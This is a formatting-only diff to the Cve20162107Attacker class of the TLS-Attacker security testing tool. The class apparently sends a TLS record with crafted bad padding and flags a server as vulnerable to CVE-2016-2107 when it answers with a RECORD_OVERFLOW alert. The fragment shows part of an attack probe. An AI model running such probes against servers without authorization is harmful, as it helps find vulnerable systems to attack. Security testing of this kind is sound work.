@@ -7,6 +7,7 @@
  * Licensed under Apache License 2.0
  * http://www.apache.org/licenses/LICENSE-2.0
  */
+
 package de.rub.nds.tlsattacker.attacks.impl;
 
 import de.rub.nds.modifiablevariable.VariableModification;
@@ -113,8 +114,8 @@ public class Cve20162107Attacker extends Attacker<Cve20162107CommandConfig> {
         messages.add(alertMessage);
         action.setExpectedMessages(messages);
         State state = new State(tlsConfig, trace);
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
-                tlsConfig.getWorkflowExecutorType(), state);
+        WorkflowExecutor workflowExecutor =
+            WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
 
         try {
             workflowExecutor.executeWorkflow();
@@ -134,14 +135,14 @@ public class Cve20162107Attacker extends Attacker<Cve20162107CommandConfig> {
         if (lm.getProtocolMessageType() == ProtocolMessageType.ALERT) {
             AlertMessage am = ((AlertMessage) lm);
             LOGGER.info("  Last protocol message: Alert ({},{}) [{},{}]", AlertLevel.getAlertLevel(am.getLevel()
-                    .getValue()), AlertDescription.getAlertDescription(am.getDescription().getValue()), am.getLevel()
-                    .getValue(), am.getDescription().getValue());
+                .getValue()), AlertDescription.getAlertDescription(am.getDescription().getValue()), am.getLevel()
+                .getValue(), am.getDescription().getValue());
         } else {
             LOGGER.info("  Last protocol message: {}", lm.getProtocolMessageType());
         }
 
         if (lm.getProtocolMessageType() == ProtocolMessageType.ALERT
-                && AlertDescription.getAlertDescription(((AlertMessage) lm).getDescription().getValue()) == AlertDescription.RECORD_OVERFLOW) {
+            && AlertDescription.getAlertDescription(((AlertMessage) lm).getDescription().getValue()) == AlertDescription.RECORD_OVERFLOW) {
             LOGGER.info("  Vulnerable");
             return true;
         } else {
@@ -151,7 +152,8 @@ public class Cve20162107Attacker extends Attacker<Cve20162107CommandConfig> {
     }
 
     private Record createRecordWithBadPadding() {
-        byte[] plain = new byte[] { (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
+        byte[] plain =
+            new byte[] { (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                 (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                 (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                 (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
